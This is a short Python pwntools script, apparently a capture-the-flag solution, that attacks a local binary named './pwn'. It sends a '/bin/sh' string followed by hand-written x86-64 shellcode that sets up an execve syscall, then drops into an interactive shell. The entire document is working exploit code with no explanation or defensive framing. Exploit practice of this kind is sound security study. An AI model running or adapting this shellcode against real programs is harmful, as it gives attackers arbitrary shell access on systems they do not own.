from pwn import *
context.arch = "amd64"
payload = b"/bin/sh\0"
payload += asm(
"""
xor al, 0x28
mov rdi, rsp
xor esi, esi
xor edx, edx
syscall
"""
)
p = process("./pwn")
p.send(payload)
p.interactive()